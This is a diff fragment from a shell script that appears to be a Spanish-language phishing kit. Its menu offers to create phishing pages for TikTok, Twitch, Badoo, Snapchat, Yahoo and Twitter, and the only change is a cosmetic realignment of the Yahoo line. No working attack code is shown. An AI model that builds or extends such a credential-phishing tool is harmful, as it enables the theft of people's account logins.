@@ -497,7 +497,7 @@ ${RED}[${WHITE}07${RED}]${ORANGE} Tiktok      <-------------------- Crear Phishi
 		${RED}[${WHITE}09${RED}]${ORANGE} Twitch      <-------------------- Crear Phishing Para Twitch 
 		${RED}[${WHITE}10${RED}]${ORANGE} Badoo       <-------------------- Crear Phishing Para Badoo 
 		${RED}[${WHITE}11${RED}]${ORANGE} Snapchat    <-------------------- Crear Phishing Para Snapchat 
-${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	      <-------------------------- Crear Phishing Para Yahoo 
+${RED}[${WHITE}12${RED}]${ORANGE} Yahoo	      <--------------- Crear Phishing Para Yahoo 
 		${RED}[${WHITE}13${RED}]${ORANGE} Twitter     <-------------------- Crear Phishing Para Twitter 
 		${RED}[${WHITE}00${RED}]${ORANGE} Salir
 
